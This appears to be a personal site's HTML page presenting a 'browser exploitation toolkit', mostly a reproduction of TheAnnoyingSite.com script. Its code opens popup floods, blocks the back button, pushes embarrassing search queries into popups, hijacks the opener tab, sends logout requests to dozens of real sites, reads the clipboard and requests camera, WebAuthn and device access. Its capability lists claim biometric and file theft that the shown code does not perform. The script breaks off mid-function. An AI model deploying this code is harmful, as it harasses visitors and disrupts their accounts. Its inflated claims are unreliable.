<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Advanced Browser Exploitation Toolkit - Educational demonstration of browser security vulnerabilities and exploitation techniques for cybersecurity research and CTF challenges.">
    <meta name="keywords" content="browser exploitation, cybersecurity, CTF, penetration testing, security research, educational tools">
    <meta name="author" content="Anthony">
    <meta name="robots" content="index, follow">
    
    <!-- Security Headers -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self';">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Advanced Browser Exploitation Toolkit">
    <meta property="og:description" content="Educational demonstration of browser security vulnerabilities">
    <meta property="og:type" content="website">
    
    <!-- Theme Color for Rainbow Effects -->
    <meta name="theme-color" content="#00ff00">
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ü¶¢</text></svg>">
    
    <title>Advanced Browser Exploitation Toolkit - Educational Security Research</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>üöÄ Advanced Browser Exploitation Toolkit</h1>
            <p class="warning">‚ö†Ô∏è WARNING: This is a powerful browser-based attack demonstration tool. Use only in controlled educational environments!</p>
            <p class="subtitle">"For The Lulz" - Educational CTF/Red Team Demo</p>
        </header>

        <template>
            <div class='hello-message'>
                <h1>Hi there!</h1>
                <h2>To get started, click the red button below.</h2>
                <h3>(or, on mobile, tap the cat!)</h3>
                <img src='static/cat-cute.jpg' alt='Cute cat' />
            </div>
        </template>

        <div class="demo-section">
            <h2>üéØ The Annoying Site Experience</h2>
            <div class="button-grid">
                <button onclick="triggerTheAnnoyingSite()" class="demo-btn full-annoyance">üíÄ TRIGGER THE ANNOYING SITE</button>
            </div>
            <p class="warning">‚ö†Ô∏è This button will activate ALL TheAnnoyingSite.com functionality - popups, videos, downloads, logout attempts, and more!</p>
        </div>

        <!-- Streamlined Technical Analysis Section -->
        <div class="demo-section technical-analysis">
            <h2>üî¨ Technical Analysis & Capabilities</h2>
            
            <div class="analysis-grid">
                <div class="analysis-card high-impact">
                    <h3>üö® HIGH IMPACT CAPABILITIES</h3>
                    <ul>
                        <li><strong>Data Exfiltration:</strong> Clipboard theft (passwords, credit cards)</li>
                        <li><strong>Surveillance:</strong> Camera/microphone access for real-time spying</li>
                        <li><strong>Biometric Theft:</strong> WebAuthn fingerprint/face recognition data</li>
                        <li><strong>Session Hijacking:</strong> Account logout and takeover capabilities</li>
                        <li><strong>Device Access:</strong> USB file theft, Bluetooth enumeration</li>
                        <li><strong>Hardware Control:</strong> Serial port, HID (keyboard/mouse) access</li>
                    </ul>
                </div>

                <div class="analysis-card medium-impact">
                    <h3>‚ö†Ô∏è MEDIUM IMPACT CAPABILITIES</h3>
                    <ul>
                        <li><strong>Social Engineering:</strong> Fake error messages, deceptive downloads</li>
                        <li><strong>Browser Manipulation:</strong> History filling, back button blocking</li>
                        <li><strong>System Trapping:</strong> Fullscreen control, user escape prevention</li>
                        <li><strong>Search Framing:</strong> Manipulate browser history for false accusations</li>
                        <li><strong>Protocol Hijacking:</strong> Redirect system-level actions</li>
                        <li><strong>Physical Manipulation:</strong> Device vibration, audio control</li>
                    </ul>
                </div>

                <div class="analysis-card red-team">
                    <h3>üî¥ RED TEAM APPLICATIONS</h3>
                    <ul>
                        <li><strong>Initial Access:</strong> Browser-based foothold</li>
                        <li><strong>Privilege Escalation:</strong> System access through browser</li>
                        <li><strong>Data Exfiltration:</strong> Stealing sensitive information</li>
                        <li><strong>Persistence:</strong> Maintaining access through browser</li>
                        <li><strong>Lateral Movement:</strong> Device-to-device propagation</li>
                        <li><strong>Social Engineering:</strong> Enhanced phishing capabilities</li>
                    </ul>
                </div>

                <div class="analysis-card legal-ethical">
                    <h3>‚öñÔ∏è LEGAL & ETHICAL CONSIDERATIONS</h3>
                    <ul>
                        <li><strong>Educational Use:</strong> ‚úÖ Legal in controlled environments</li>
                        <li><strong>Malicious Use:</strong> ‚ùå Illegal - unauthorized access</li>
                        <li><strong>Privacy Violations:</strong> ‚ùå Unethical data theft</li>
                        <li><strong>Surveillance:</strong> ‚ùå Harmful spying capabilities</li>
                        <li><strong>Account Takeover:</strong> ‚ùå Session hijacking</li>
                        <li><strong>Device Control:</strong> ‚ùå Hardware manipulation</li>
                    </ul>
                </div>
            </div>

            <div class="disclaimer">
                <h3>‚ö†Ô∏è IMPORTANT DISCLAIMER</h3>
                <p>This tool demonstrates advanced browser exploitation techniques for educational purposes only. 
                The capabilities shown are essentially a <strong>browser-based Remote Access Tool (RAT)</strong> 
                that can perform data theft, surveillance, and system manipulation. Use only in controlled 
                educational environments with proper consent and authorization.</p>
                
                <p><strong>Risk Level: HIGH</strong> - This is malicious software that could be extremely 
                dangerous in the wrong hands. It bypasses browser security models and can access sensitive 
                system resources.</p>
            </div>
        </div>

        <div id="logout-messages" class="logout-messages"></div>

        <!-- Navigation Section -->
        <div class="navigation">
            <a href="../index.html">‚Üê Back to Home</a> | 
            <a href="../blog/blog.html">‚Üê Blog</a> | 
            <a href="../desktop/index.html">‚Üê Cyberpunk Desktop</a>
        </div>
    </div>

    <script>
        // Constants from TheAnnoyingSite.com
        const SCREEN_WIDTH = window.screen.availWidth;
        const SCREEN_HEIGHT = window.screen.availHeight;
        const WIN_WIDTH = 480;
        const WIN_HEIGHT = 360;
        const VELOCITY = 15;
        const MARGIN = 15;
        const TOP_MARGIN = 50;
        const TICK_LENGTH = 50;
        const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';

        // ASCII Art templates from TheAnnoyingSite.com
        const ART = [
            `
‚îä‚îä ‚òÜ‚îä‚îä‚îä‚îä‚òÜ‚îä‚îä‚òÜ ‚îä‚îä‚îä‚îä‚îä
‚îà‚îà‚îà‚îà‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ‚îä‚òÜ ‚îä‚îä
‚îà‚òÜ ‚îà‚îà‚îÉ‚ï≥‚ï≥‚ï≥‚ñï‚ï≤‚ñÇ‚ñÇ‚ï±‚ñè‚îä‚îä
‚îà‚îà‚òÜ ‚îà‚îÉ‚ï≥‚ï≥‚ï≥‚ñï‚ñè‚ñç‚ñï‚ñç‚ñè‚îä‚îä
‚îà‚îà‚ï∞‚îÅ‚î´‚ï≥‚ï≥‚ï≥‚ñï‚ñè‚ï∞‚îª‚ïØ‚ñè‚îä‚îä
‚òÜ ‚îà‚îà‚îà‚îÉ‚ï≥‚ï≥‚ï≥‚ï≥‚ï≤‚ñÇ‚ñÇ‚ï±‚îä‚îä‚îä
‚îä‚îä‚òÜ‚îä‚ï∞‚î≥‚î≥‚îÅ‚îÅ‚î≥‚î≥‚ïØ‚îä ‚îä ‚òÜ‚îä
            `,
            `
‚ñë‚ñë‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñì‚ñì‚ñë‚ñë
‚ñë‚ñì‚ñí‚ñí‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñì‚ñí‚ñí‚ñì‚ñë
‚ñë‚ñì‚ñí‚ñí‚ñí‚ñì‚ñë‚ñë‚ñë‚ñë‚ñì‚ñí‚ñí‚ñí‚ñì‚ñë
‚ñë‚ñì‚ñí‚ñí‚ñí‚ñí‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñí‚ñí‚ñì‚ñë
‚ñë‚ñì‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñì
‚ñì‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñì
‚ñì‚ñí‚ñí‚ñí‚ñë‚ñì‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë‚ñì‚ñí‚ñí‚ñì
‚ñì‚ñí‚ñí‚ñí‚ñì‚ñì‚ñí‚ñí‚ñí‚ñì‚ñí‚ñì‚ñì‚ñí‚ñí‚ñì
‚ñì‚ñí‚ñë‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë‚ñë‚ñì
‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñí‚ñí‚ñì‚ñí‚ñí‚ñì‚ñí‚ñë‚ñë‚ñì
‚ñë‚ñì‚ñí‚ñí‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñì‚ñë
‚ñë‚ñë‚ñì‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñì‚ñë‚ñë
‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë
            `
        ];

        // Search queries from TheAnnoyingSite.com
        const SEARCHES = [
            'where should i bury the body',
            'why does my eye twitch',
            'why is my poop green',
            'why do i feel so empty',
            'why do i always feel hungry',
            'why do i always have diarrhea',
            'why does my anus itch',
            'why does my belly button smell',
            'why does my cat attack me',
            'why does my dog eat poop',
            'why does my fart smell so bad',
            'why does my mom hate me',
            'why does my pee smell bad',
            'why does my poop float',
            'proof that the earth is flat'
        ];

        // Video files from TheAnnoyingSite.com
        const VIDEOS = [
            'albundy.mp4',
            'badger.mp4',
            'cat.mp4',
            'hasan.mp4',
            'heman.mp4',
            'jozin.mp4',
            'nyan.mp4',
            'rickroll.mp4',
            'space.mp4',
            'trolol.mp4'
        ];

        // File downloads from TheAnnoyingSite.com
        const FILE_DOWNLOADS = [
            'cat-blue-eyes.jpg',
            'cat-ceiling.jpg',
            'cat-crosseyes.jpg',
            'cat-cute.jpg',
            'cat-hover.jpg',
            'cat-marshmellows.jpg',
            'cat-small-face.jpg',
            'cat-smirk.jpg',
            'patreon.png'
        ];

        // Phrases for text-to-speech from TheAnnoyingSite.com
        const PHRASES = [
            'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
            'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
            'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
            'I\'ve never seen the inside of my own mouth because it scares me to death.',
            'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
            'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
            'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
        ];

        // Logout sites from TheAnnoyingSite.com
        const LOGOUT_SITES = {
            AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
            'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
            Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
            Blogger: ['GET', 'https://www.blogger.com/logout.g'],
            Delicious: ['GET', 'https://www.delicious.com/logout'],
            DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
            DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
            Dropbox: ['GET', 'https://www.dropbox.com/logout'],
            eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
            Gandi: ['GET', 'https://www.gandi.net/login/out'],
            GitHub: ['GET', 'https://github.com/logout'],
            GMail: ['GET', 'https://mail.google.com/mail/?logout'],
            Google: ['GET', 'https://www.google.com/accounts/Logout'],
            Hulu: ['GET', 'https://secure.hulu.com/logout'],
            Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
            Linode: ['GET', 'https://manager.linode.com/session/logout'],
            LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
            MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
            NetFlix: ['GET', 'https://www.netflix.com/Logout'],
            'New York Times': ['GET', 'https://www.nytimes.com/logout'],
            Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
            Photobucket: ['GET', 'https://photobucket.com/logout'],
            Skype: ['GET', 'https://secure.skype.com/account/logout'],
            Slashdot: ['GET', 'https://slashdot.org/my/logout'],
            SoundCloud: ['GET', 'https://soundcloud.com/logout'],
            'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
            'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
            ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
            Threadless: ['GET', 'https://www.threadless.com/logout'],
            Tumblr: ['GET', 'https://www.tumblr.com/logout'],
            Vimeo: ['GET', 'https://vimeo.com/log_out'],
            Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
            'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
            Woot: ['GET', 'https://account.woot.com/logout'],
            Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
            Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
            YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
        };

        // Global variables from TheAnnoyingSite.com
        const wins = [];
        let interactionCount = 0;
        let numSuperLogoutIframes = 0;
        const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1;
        const isParentWindow = !isChildWindow;

        // Helper function for determining if parent window is same origin
        function isParentSameOrigin() {
            try {
                return window.opener.location.origin === window.location.origin;
            } catch (err) {
                return false;
            }
        }

        // Get a random element from a given array from TheAnnoyingSite.com
        function getRandomArrayEntry(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        // Get random x, y coordinates for a new window on the screen from TheAnnoyingSite.com
        function getRandomCoords() {
            const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
            const y = TOP_MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
            return { x, y };
        }

        // The main function that triggers TheAnnoyingSite.com experience
        function triggerTheAnnoyingSite() {
            console.log('üíÄ THE ANNOYING SITE EXPERIENCE ACTIVATED!');
            
            // Initialize TheAnnoyingSite.com behavior
            init();
            
            // If this is a parent window, initialize parent-specific behavior
            if (isParentWindow) {
                initParentWindow();
            }
            
            // If this is a child window, initialize child-specific behavior
            if (isChildWindow) {
                initChildWindow();
            }
            
            // Start the full annoyance experience
            startVibrateInterval();
            speak('That was a mistake');
            startTheramin();
            blockBackButton();
            fillHistory();
            requestCameraAndMic();
            requestClipboardRead();
            requestFullscreen();
            requestMidiAccess();
            requestBluetoothAccess();
            requestUsbAccess();
            requestSerialAccess();
            requestHidAccess();
            requestWebauthnAttestation();
            registerProtocolHandlers();
            animateUrlWithEmojis();
            
            // Window management
            openWindow();
            hideCursor();
            requestPointerLock();
            enablePictureInPicture();
            rainbowThemeColor();
            
            // Advanced features
            moveWindowBounce();
            setupFollowWindow();
            startVideo();
            startInvisiblePictureInPictureVideo();
            copySpamToClipboard();
            startAlertInterval();
            confirmPageUnload();
            attemptToTakeoverReferrerWindow();
            focusWindows();
            superLogout();
            
            // File downloads
            triggerFileDownload();
            
            // Remove hello message if it exists
            removeHelloMessage();
        }

        // Initialize TheAnnoyingSite.com behavior
        function init() {
            confirmPageUnload();
        }

        // Initialize child window behavior
        function initChildWindow() {
            registerProtocolHandlers();
            hideCursor();
            moveWindowBounce();
            setupFollowWindow();
            startVideo();
            detectWindowClose();
            triggerFileDownload();
            speak();
            rainbowThemeColor();
            animateUrlWithEmojis();
            startAlertInterval();
        }

        // Initialize parent window behavior
        function initParentWindow() {
            showHelloMessage();
            blockBackButton();
            fillHistory();
            startInvisiblePictureInPictureVideo();
            superLogout();
        }

        // Remove hello message
        function removeHelloMessage() {
            const helloMessage = document.querySelector('.hello-message');
            if (helloMessage) helloMessage.remove();
        }

        // Show the unsuspecting user a friendly hello message with a cat
        function showHelloMessage() {
            const template = document.querySelector('template');
            if (template) {
                const clone = document.importNode(template.content, true);
                document.body.appendChild(clone);
            }
        }

        // Ask the user "are you sure you want to leave this page?"
        function confirmPageUnload() {
            window.addEventListener('beforeunload', event => {
                speak('Please don\'t go!');
                event.returnValue = true;
            });
        }

        // Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
        // link in a new window. For example, Messenger.com from Facebook does this.
        // However, that means that `window.opener` will be set, which allows us to redirect
        // that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
        function attemptToTakeoverReferrerWindow() {
            if (isParentWindow && window.opener && !isParentSameOrigin()) {
                window.opener.location = `${window.location.origin}/?child=true`;
            }
        }

        // Focus all child windows
        function focusWindows() {
            wins.forEach(win => {
                if (!win.closed) win.focus();
            });
        }

        // Open a new popup window
        function openWindow() {
            const { x, y } = getRandomCoords();
            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
            const win = window.open(window.location.pathname, '', opts);

            if (!win) return;
            wins.push(win);

            if (wins.length === 2) setupSearchWindow(win);
        }

        // Setup search window with Bing searches
        function setupSearchWindow(win) {
            if (!win) return;
            const { x, y } = getRandomCoords();
            win.moveTo(x, y);
            win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
            win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0]);
            let searchIndex = 1;
            const interval = setInterval(() => {
                if (win.closed) {
                    clearInterval(interval);
                    onCloseWindow(win);
                    return;
                }

                win.window.location = window.location.pathname;
                setTimeout(() => {
                    win.resizeTo(WIN_WIDTH, WIN_HEIGHT);
                }, 500);
                setTimeout(() => {
                    const { x, y } = getRandomCoords();
                    win.moveTo(x, y);
                    win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
                    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex]);

                    searchIndex += 1;
                    if (searchIndex >= SEARCHES.length) {
                        searchIndex = 0;
                    }
                }, 1000);
            }, 3000);
        }

        // Handle a child window closing
        function onCloseWindow(win) {
            const i = wins.indexOf(win);
            if (i >= 0) wins.splice(i, 1);
        }

        // When a child window closes, notify the parent window
        function detectWindowClose() {
            window.addEventListener('unload', () => {
                if (!window.opener.closed) window.opener.onCloseWindow(window);
            });
        }

        // Move the window around the screen and bounce off of the screen edges
        function moveWindowBounce() {
            let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
            let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);

            setInterval(() => {
                const x = window.screenX;
                const y = window.screenY;
                const width = window.outerWidth;
                const height = window.outerHeight;

                if (x < MARGIN) vx = Math.abs(vx);
                if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx);
                if (y < TOP_MARGIN) vy = Math.abs(vy);
                if (y + height > SCREEN_HEIGHT - TOP_MARGIN) vy = -1 * Math.abs(vy);

                window.moveBy(vx, vy);
            }, TICK_LENGTH);
        }

        // Follow the user's mouse
        function setupFollowWindow() {
            document.addEventListener('mousemove', function(e) {
                window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2));
            });
        }

        // Show a random troll video in the window
        function startVideo() {
            const video = document.createElement('video');
            video.src = getRandomArrayEntry(VIDEOS);
            video.autoplay = true;
            video.loop = true;
            video.style = 'width: 100%; height: 100%;';
            document.body.appendChild(video);
        }

        // Start an invisible, muted video so we have one ready to put into
        // picture-in-picture mode on the first user-interaction
        function startInvisiblePictureInPictureVideo() {
            const video = document.createElement('video');
            video.src = getRandomArrayEntry(VIDEOS);
            video.loop = true;
            video.muted = true;
            video.style = HIDDEN_STYLE;
            video.autoplay = true;
            video.play();
            document.body.appendChild(video);
        }

        // Hide the user's cursor
        function hideCursor() {
            document.querySelector('html').style = 'cursor: none;';
        }

        // Lock the user's pointer, without even being in full screen
        function requestPointerLock() {
            const requestPointerLockApi = (
                document.body.requestPointerLock ||
                document.body.webkitRequestPointerLock ||
                document.body.mozRequestPointerLock ||
                document.body.msRequestPointerLock
            );
            requestPointerLockApi.call(document.body);
        }

        // Active Safari's picture-in-picture feature
        function enablePictureInPicture() {
            const video = document.querySelector('video');
            if (document.pictureInPictureEnabled && video) {
                video.style = '';
                video.muted = false;
                video.requestPictureInPicture();
                video.play();
            }
        }

        // Fullscreen the browser window
        function requestFullscreen() {
            const requestFullscreen = Element.prototype.requestFullscreen ||
                Element.prototype.webkitRequestFullscreen ||
                Element.prototype.mozRequestFullScreen ||
                Element.prototype.msRequestFullscreen;
            requestFullscreen.call(document.body);
        }

        // Disable the back button
        function blockBackButton() {
            window.addEventListener('popstate', () => {
                window.history.forward();
            });
        }

        // Fill the history with extra entries
        function fillHistory() {
            for (let i = 1; i < 20; i++) {
                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
            }
            window.history.pushState({}, '', window.location.pathname);
        }

        // Start vibrating the device at random intervals
        function startVibrateInterval() {
            if (typeof window.navigator.vibrate !== 'function') return;
            setInterval(() => {
                const duration = Math.floor(Math.random() * 600);
                window.navigator.vibrate(duration);
            }, 1000);

            // If the gamepad can vibrate, we will at random intervals every second
            window.addEventListener('gamepadconnected', (event) => {
                const gamepad = event.gamepad;
                if (gamepad.vibrationActuator) {
                    setInterval(() => {
                        if (gamepad.connected) {
                            gamepad.vibrationActuator.playEffect('dual-rumble', {
                                duration: Math.floor(Math.random() * 600),
                                strongMagnitude: Math.random(),
                                weakMagnitude: Math.random()
                            });
                        }
                    }, 1000);
                }
            });
        }

        // Start an annoying theramin that changes pitch and volume depending on
        // the mouse position
        function startTheramin() {
            const audioContext = new AudioContext();
            const oscillatorNode = audioContext.createOscillator();
            const gainNode = audioContext.createGain();

            const pitchBase = 50;
            const pitchRange = 4000;

            const wave = audioContext.createPeriodicWave(
                Array(10).fill(0).map((v, i) => Math.cos(i)),
                Array(10).fill(0).map((v, i) => Math.sin(i))
            );

            oscillatorNode.setPeriodicWave(wave);
            oscillatorNode.connect(gainNode);
            gainNode.connect(audioContext.destination);
            oscillatorNode.start(0);

            const oscillator = ({ pitch, volume }) => {
                oscillatorNode.frequency.value = pitchBase + pitch * pitchRange;
                gainNode.gain.value = volume * 0.5;
            };

            document.body.addEventListener('mousemove', event => {
                const { clientX, clientY } = event;
                const { clientWidth, clientHeight } = document.body;
                const pitch = (clientX - clientWidth / 2) / clientWidth;
                const volume = (clientY - clientHeight / 2) / clientHeight;
                oscillator({ pitch, volume });
            });
        }

        // Speak the given `phrase` using text-to-speech
        function speak(phrase) {
            if (phrase == null) phrase = getRandomArrayEntry(PHRASES);
            window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase));
        }

        // Change the theme color of the browser in a loop
        function rainbowThemeColor() {
            const meta = document.querySelector('meta[name="theme-color"]');
            if (meta) {
                setInterval(() => {
                    const color = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
                    meta.setAttribute('content', color);
                }, 50);
            }
        }

        // Animating the URL with emojis
        function animateUrlWithEmojis() {
            if (window.ApplePaySession) {
                return;
            }
            const rand = Math.random();
            if (rand < 0.33) {
                animateUrlWithBabies();
            } else if (rand < 0.67) {
                animateUrlWithWave();
            } else {
                animateUrlWithMoons();
            }

            function animateUrlWithBabies() {
                const e = ['üèª', 'üèº', 'üèΩ', 'üèæ', 'üèø'];
                setInterval(() => {
                    let s = '';
                    let i; let m;
                    for (i = 0; i < 10; i++) {
                        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2));
                        s += 'üë∂' + e[m];
                    }
                    window.location.hash = s;
                }, 100);
            }

            function animateUrlWithWave() {
                setInterval(() => {
                    let i; let n; let s = '';
                    for (i = 0; i < 10; i++) {
                        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4;
                        s += String.fromCharCode(0x2581 + n);
                    }
                    window.location.hash = s;
                }, 100);
            }

            function animateUrlWithMoons() {
                const f = ['üåë', 'üåò', 'üåó', 'üåñ', 'üåï', 'üåî', 'üåì', 'üåí'];
                const d = [0, 0, 0, 0, 0, 0, 0, 0];
                let m = 0;
                setInterval(() => {
                    let s = '';
                    let x = 0;
                    if (!m) {
                        while (d[x] === 4) {
                            x++;
                        }
                        if (x >= d.length) m = 1;
                        else {
                            d[x]++;
                        }
                    } else {
                        while (d[x] === 0) {
                            x++;
                        }
                        if (x >= d.length) m = 0;
                        else {
                            d[x]++;
                            if (d[x] === 8) d[x] = 0;
                        }
                    }
                    d.forEach(function (n) {
                        s += f[n];
                    });
                    window.location.hash = s;
                }, 100);
            }
        }

        // Copy cat pictures onto the user's clipboard
        function copySpamToClipboard() {
            const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com';
            clipboardCopy(randomArt);
        }

        // Copy given text onto the user's clipboard
        function clipboardCopy(text) {
            const span = document.createElement('span');
            span.textContent = text;
            span.style.whiteSpace = 'pre';

            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-same-origin';
            document.body.appendChild(iframe);

            let win = iframe.contentWindow;
            win.document.body.appendChild(span);

            let selection = win.getSelection();

            if (!selection) {
                win = window;
                selection = win.getSelection();
                document.body.appendChild(span);
            }

            const range = win.document.createRange();
            selection.removeAllRanges();
            range.selectNode(span);
            selection.addRange(range);

            let success = false;
            try {
                success = win.document.execCommand('copy');
            } catch (err) {
                console.log(err);
            }

            selection.removeAllRanges();
            span.remove();
            iframe.remove();

            return success;
        }

        // Show a modal dialog at a regular interval
        function startAlertInterval() {
            setInterval(() => {
                if (Math.random() < 0.5) {
                    showAlert();
                } else {
                    window.print();
                }
            }, 120000);
        }

        // Show an alert with 1000's of lines of cat ASCII art
        function showAlert() {
            const randomArt = getRandomArrayEntry(ART);
            const longAlertText = Array(200).join(randomArt);
            window.alert(longAlertText);
        }

        // Trigger a file download immediately
        function triggerFileDownload() {
            const fileName = getRandomArrayEntry(FILE_DOWNLOADS);
            const a = document.createElement('a');
            a.href = `static/${fileName}`;
            a.download = fileName;
            a.click();
        }

        // Request access to camera and microphone
        function requestCameraAndMic() {
            if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
                return;
            }

            navigator.mediaDevices.enumerateDevices().then(devices => {
                const cameras = devices.filter((device) => device.kind === 'videoinput');

                if (cameras.length === 0) return;
                const camera = cameras[cameras.length - 1];

                navigator.mediaDevices.getUserMedia({
                    deviceId: camera.deviceId,
                    facingMode: ['user', 'environment'],
                    audio: true,
                    video: true
                }).then(stream => {
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new window.ImageCapture(track);

                    imageCapture.getPhotoCapabilities().then(() => {
                        track.applyConstraints({ advanced: [{ torch: true }] });
                    }, () => { /* No torch on this device */ });
                }, () => { /* ignore errors */ });
            });
        }

        // Attempt to read the user's clipboard
        function requestClipboardRead() {
            try {
                navigator.clipboard.readText().then(
                    data => {
                        if (!window.ApplePaySession) {
                            console.log("Successfully read data from clipboard: '" + data + "'");
                        }
                    },
                    () => {}
                );
            } catch {}
        }

        // Request Webauthn attestation
        function requestWebauthnAttestation() {
            try {
                const createCredentialDefaultArgs = {
                    publicKey: {
                        rp: { name: 'Acme' },
                        user: {
                            id: new Uint8Array(16),
                            name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
                            displayName: 'YOU ARE HACKED'
                        },
                        pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
                        attestation: 'direct',
                        timeout: 60000,
                        challenge: new Uint8Array([
                            0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
                            0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
                        ]).buffer
                    }
                };

                const getCredentialDefaultArgs = {
                    publicKey: {
                        timeout: 60000,
                        challenge: new Uint8Array([
                            0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
                            0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
                        ]).buffer
                    }
                };

                navigator.credentials.create(createCredentialDefaultArgs)
                    .then((cred) => {
                        const idList = [{
                            id: cred.rawId,
                            transports: ['usb', 'nfc', 'ble'],
                            type: 'public-key'
                        }];
                        getCredentialDefaultArgs.publicKey.allowCredentials = idList;
                        return navigator.credentials.get(getCredentialDefaultArgs);
                    });
            } catch {}
        }

        // Request access to MIDI devices
        function requestMidiAccess() {
            try {
                navigator.requestMIDIAccess({ sysex: true });
            } catch {}
        }

        // Request access to Bluetooth devices
        function requestBluetoothAccess() {
            try {
                navigator.bluetooth.requestDevice({ acceptAllDevices: true })
